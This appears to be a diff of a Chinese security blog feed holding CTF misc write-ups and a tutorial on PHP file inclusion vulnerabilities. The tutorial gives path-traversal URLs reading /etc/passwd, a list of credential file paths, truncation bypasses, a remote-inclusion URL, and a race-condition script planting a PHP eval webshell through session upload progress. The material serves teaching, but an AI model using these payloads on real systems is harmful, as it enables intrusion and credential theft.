+<h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>我通过binwalk命令查看到流量包中有存在压缩包，我利用命令分离文件，但是文件损坏</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foremost -T wget.pcapng </span><br></pre></td></tr></table></figure>
+
+<p>我直接在wirshark中直接保存出得到压缩包，但是压缩包需要密码。利用ZipCenOp.jar修复zip压缩包。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar .\ZipCenOp.jar r .\1.zip</span><br></pre></td></tr></table></figure>
+
+<p>解开压缩包得到flag文件</p>
+<p>使用strings命令就可以输出flag：actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p>
+<h1 id="Misc6"><a href="#Misc6" class="headerlink" title="Misc6"></a>Misc6</h1><p>[ACTF新生赛2021]与熊论道</p>
+<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>与熊论道编码</li>
+<li>社会主义核心价值观编码</li>
+<li>bmp图片隐写</li>
+</ul>
+<h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>猜测是和与禅论道一样的编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">熊曰：呋食性咯怎很盜溫吖盜萌嚄眠嗥吖物和我嘿襲人現擊有嚁嘿襲嗡取果盜和吖非嗷咬和取象洞家食住捕咬嗅拙喜爾常拙捕咯會呦唬沒歡肉咬哞笨註氏破吃咯噤誘嗡唬樣取偶蜜嗒我咬咬嘶盜覺歡我嗡嗅哞麼你和嗄會取喜嗡咬歡象取襲</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://hi.pcmoe.net/">与熊论道</a></p>
+<p>解得：<code>法治富强法治法治公正自由和谐诚信富强和谐民主和谐文明和谐和谐和谐自由和谐平等和谐公正</code></p>
+<p><a href="https://atool.vip/corevalue/">社会主义核心价值观编码</a></p>
+<p>解得：<code>pwd:123456</code></p>
+<p>密码是干嘛用的呢？</p>
+<p>有关bmp图片隐写，我找到两个工具wbStego4.3open和silenteye</p>
+<p>这题用wbStego4.3open就可以解密</p>
+<p><strong><code>ACTF&#123;PXY_wants_@_bOyfri3nd&#125;</code></strong></p>
+<h1 id="Misc7"><a href="#Misc7" class="headerlink" title="Misc7"></a>Misc7</h1><p>[ACTF新生赛2020]你看我匀称吗？</p>
+<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>LSB隐写</li>
+<li>修改图片宽高</li>
+</ul>
+<h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>两个文件一个要密码的压缩包，匀称？猜测高度有问题</p>
+<p>使用工具TweakPNG查看，发现有报错</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313165532165.png"></p>
+<p>用010打开图片修改</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313170605117.png"></p>
+<p>得到：<strong>you come</strong>。解压得到图片</p>
+<p>猜测LSB隐写</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313171718397.png"></p>
+<p>得到flag：**<code>ACTF&#123;llL llsb_i3_e3asY&#125;</code>**</p>
+<h1 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h1><p>[ACTF新生赛2020]剑龙</p>
+<h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>AAencode编码（颜文字）</li>
+<li>steghide隐写</li>
+<li>DES加解密</li>
+<li>stegosaurus（pyc）隐写</li>
+</ul>
+<h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>解开hint文件夹得到一个图片与文本</p>
+<p>文本中是颜文字；<a href="http://www.hiencode.com/aaencode.html">在线解码</a></p>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcom3!</span><br></pre></td></tr></table></figure>
+
+<p>在图片信息中可以看</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313172549463.png"></p>
+<p>key：<code>**@#$%^&amp;%%$)**</code></p>
+<p>hh.jpg是<strong>steghide</strong>隐写</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313183441314.png"></p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1/7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj/Q==</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.sojson.com/encrypt_des.html">DES解密</a></p>
+<p>得到：<strong>think about stegosaurus</strong></p>
+<p>对文件进行file命令，发现是python文件 <strong><code>O_O: python 3.6 byte-compiled</code></strong></p>
+<p>运行命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./stegosaurus -x O_O.pyc </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313190100195.png"></p>
+<p>得到flag：**<code>flag&#123;3teg0Sauru3_!1&#125;</code>**</p>
+<h1 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h1><p>[ACTF新生赛2020]明文攻击</p>
+<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>CRC爆破</li>
+</ul>
+<h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>提示明文攻击</p>
+<p>先看图片，在图片尾有flag.txt，补上<code>50 4B</code></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313202715767.png"></p>
+<p>新建成压缩包</p>
+<p>对比两个包</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203046943.png"></p>
+<p>两个包的CRC是一样的</p>
+<p>进行爆破</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203155571.png"></p>
+<h1 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h1><p>[ACTF新生赛2020]近在眼前</p>
+<h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>base64隐写</li>
+</ul>
+<h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/zxy13/Desktop/2022311/10/近在眼前/ComeOn!.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line[:-<span class="number">1</span>]</span><br><span class="line">        num = line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        lastchar = line[-(num + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(line,num,lastchar)</span></span><br><span class="line">        myindex = base64chars.index(lastchar)</span><br><span class="line">        <span class="comment"># print(myindex)</span></span><br><span class="line">        bin_str = <span class="built_in">bin</span>(myindex)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># print(bin_str)</span></span><br><span class="line">        flag += bin_str[<span class="number">6</span> - <span class="number">2</span> * num:]</span><br><span class="line">        <span class="comment"># print(bin_str[6-2*num:])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>)]))</span><br></pre></td></tr></table></figure>
+
+<p>运行得到</p>
+<p><strong><code>ACTF&#123;6aseb4_f33!&#125;</code></strong></p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
       </tags>
   </entry>
   <entry>
@@ -636,48 +733,279 @@
       </tags>
   </entry>
   <entry>
-    <title>win10内网穿透</title>
-    <url>/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是我在探索服务器路上的一次记录，为了就是先去了解服务器。方便自己尝试，这篇文章也是参考许多大佬的文章。希望可以给你提供一点帮助。</p>
+    <title>文件包含漏洞</title>
+    <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含是指会在单个文件写入需要重复使用的函数，在需要使用的时候就直接调用此文件，这种文件调用的过程一般被称为文件包含。文件包含分为本地文件包含和远程文件包含，说明如下：</p>
+<ul>
+<li>当被包含的文件在服务器本地时，称为本地文件包含。</li>
+<li>当被包含的文件在第三方服务器时，称为远程文件包含。</li>
+</ul>
 <span id="more"></span>
 
-<h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><ul>
-<li>Windows镜像</li>
-<li>VM16虚拟机</li>
-<li>花生壳8</li>
-<li>宝塔</li>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>由于开发人员没对文件名设置严格的规则，和其服务器上的没有过滤掉这些恶意文件，导致带有恶意代码的文件进入被包含进服务器中，从而形成了文件包含漏洞。</p>
+<h2 id="PHP中引发漏洞的函数"><a href="#PHP中引发漏洞的函数" class="headerlink" title="PHP中引发漏洞的函数"></a>PHP中引发漏洞的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 表达式包含并运行指定文件</span><br><span class="line"><span class="keyword">include_once</span>(): 表达式包含并运行指定重复运行的文件</span><br><span class="line"><span class="keyword">require</span>():</span><br><span class="line"><span class="keyword">require_once</span>(): PHP会检查该文件是否已经被包含过，如果是则不会再次包含。</span><br></pre></td></tr></table></figure>
+
+<p>include() 函数在包含中出现错误，会警告一次，但是代码会继续运行，require() 函数它与 include 函数几乎一样，区别是它运行错误就会中止脚本。</p>
+<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>类似代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a><strong>读取敏感信息</strong></h3><p>本地无限制读取，服务器没有过滤敏感信息。</p>
+<p><strong>Exp:</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>常见敏感信息路径：路径也可能因为版本的更新而更改</p>
+<table>
+<thead>
+<tr>
+<th>Windows系统路径</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>c:\boot.ini</td>
+<td>查看系统版本</td>
+</tr>
+<tr>
+<td>c:\windows\system32\inetsrv\MetaBase.xml</td>
+<td>IIS配置文件</td>
+</tr>
+<tr>
+<td>c:\windows\repair\sam</td>
+<td>存储Windows系统初次安装的密码</td>
+</tr>
+<tr>
+<td>c:\ProgramFiles\mysql\my.ini</td>
+<td>MySQL配置</td>
+</tr>
+<tr>
+<td>c:\ProgramFiles\mysql\data\mysql\user.MYD</td>
+<td>MySQL root密码</td>
+</tr>
+<tr>
+<td>windows系统</td>
+<td>php 配置信息</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>Linux&#x2F;Unix系统路径</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;etc&#x2F;passwd</td>
+<td>账户信息</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;shadow</td>
+<td>账户密码文件</td>
+</tr>
+<tr>
+<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</td>
+<td>Apache2默认配置文件</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</td>
+<td>虚拟网站配置</td>
+</tr>
+<tr>
+<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini</td>
+<td>PHP相关配置</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</td>
+<td>Apache配置文件</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;my.conf</td>
+<td>mysql 配置文件</td>
+</tr>
+</tbody></table>
+<h3 id="Session漏洞利用"><a href="#Session漏洞利用" class="headerlink" title="Session漏洞利用"></a>Session漏洞利用</h3><ul>
+<li><strong>php中的session.upload_progress</strong></li>
 </ul>
-<h1 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h1><p>虚拟机安安装就不嘴碎了，估计网上有许多教材，自己参考大佬再写。</p>
-<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>安装Window10虚拟机，我选择专业版与自定义安装。</p>
-<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>对虚拟机内的windows进行端口配置</p>
-<p>打开控制面板中系统和安全，打开防火墙设置，然后打开高级设置。</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192438-cgxcimc.png" alt="image.png"></p>
-<p>选择“入站规则” —&gt; “新建规则”</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192919-b07jjg4.png" alt="image.png"></p>
-<p>选择TCP，开放端口可以自己设置。</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192848-ai6dfyx.png" alt="image.png"></p>
-<p>接下来默认就可以了。</p>
-<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>下载宝塔面板 ：<a href="https://www.bt.cn/">宝塔官网</a></p>
-<p>安装完成注册，打开宝塔面板</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193333-87xordg.png" alt="image.png"></p>
-<p>红框里保持默认，尽量不要修改。</p>
-<p>安装进去网站后，安装Nginx套件就好了。</p>
-<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>安装注册花生壳，自己注册后就会得到一个域名</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193702-hpmbecv.png" alt="image.png"></p>
-<p>然后新建一个自定义映射</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193914-5x22eh1.png" alt="image.png"></p>
-<p>映射成功就好了。</p>
-<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>在宝塔里面添加站点</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326194149-fcey653.png" alt="image.png"></p>
-<p>默认就好。剩下就是你自己写站点了。</p>
+<p>前提：php版本 &gt; php5.4</p>
+<p>在php.ini中有几个默认选项</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.freq</span> = <span class="string">&quot;1%&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.min_freq</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">session.use_strict_mode</span>=<span class="literal">off</span></span><br></pre></td></tr></table></figure>
+
+<p>详解配置</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">enabled=on表示upload<span class="built_in">_</span>progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">prefix+name将表示为session中的键名</span><br><span class="line">session.use<span class="built_in">_</span>strict<span class="built_in">_</span>mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。</span><br></pre></td></tr></table></figure>
+
+<p>可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
+<ul>
+<li>前提：session 的存储位置可以获取</li>
+</ul>
+<p>通过phpinfo函数，读取session的存储位置，一般路径为：在session.save_path中有显示</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png" class title="This is an image">
+
+<ul>
+<li>条件竞争</li>
+</ul>
+<p>举个例子</p>
+<p>将包含漏洞的代码写入文件 session.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个代码功能，通过 GET 将变量值读入到 session 中。</p>
+<p>首先需要通过传入变量，查看 Cookies 中的 PHPSESSID 的值，其内容就是文件名。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/session.php?ctfs=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Exp：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../var/lib/php/session文件名</span><br></pre></td></tr></table></figure>
+
+<p>通过上面写入的恶意代码，你访问文件名就可以执行了。</p>
+<p><strong>问题一</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果没有session_start(),如何创建session文件</span><br></pre></td></tr></table></figure>
+
+<p>解答：</p>
+<p>当session.auto_start&#x3D;on时，PHP在接受到请求后初始化Session，不用执行session_start（）。但是默认情况下，这个选项是不开启的。</p>
+<p>但是session中存在一个默认选项，<code>session.use_strict_mode=0</code>。表示用户可以自定义session的ID，例如，设置Cookie里的PHPSESSION&#x3D;FLAG，php就会在服务上创建一个文件：&#x2F;tmp&#x2F;sess_FLAG。虽然我们自己没有初始化，但是PHP也会自动初始化。并产生一个键值这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
+<p>漏洞利用脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">​</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><p><strong>%00截断</strong></p>
+<p>前提：<code>php.ini</code>中<code>magic_quotes_qpc=off</code>并且<code>PHP</code>版本&lt; 5.3.4的情况。</p>
+<p>漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它会在你访问的文件中加上 html ，但是你可以通过截断来绕过它。</p>
+<p>Exp：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
+
+<p><strong>长度绕过</strong></p>
+<p>前提：在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line"></span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Exp:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure>
+
+<p><strong>点号截断</strong></p>
+<p>Exp:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
+
+<p><strong>特殊符号</strong></p>
+<p>利用特色符号进行绕过，例如 ?、#、*、%20（空格）等</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt?</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>服务器的PHP配置文件中allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件。如果没有对远程文件进行严格的过滤，从而执行恶意代码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = On（是否允许打开远程文件）</span><br><span class="line"></span><br><span class="line">allow_url_include = On（是否允许<span class="keyword">include</span>/<span class="keyword">require</span>远程文件）</span><br></pre></td></tr></table></figure>
+
+<p>漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Exp：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=http://192.168.91.133/FI/test.php%20</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP伪协议文件包含"><a href="#PHP伪协议文件包含" class="headerlink" title="PHP伪协议文件包含"></a>PHP伪协议文件包含</h2><p>PHP是门强大的语言，所以PHP里面有许多已经封装好的协议，类似于库函数，是可以直接调用的，由于没有进行严格过滤，入侵者就可以利用这些协议完成恶意操作。可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
+<h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>这是一个访问本地文件的协议。</p>
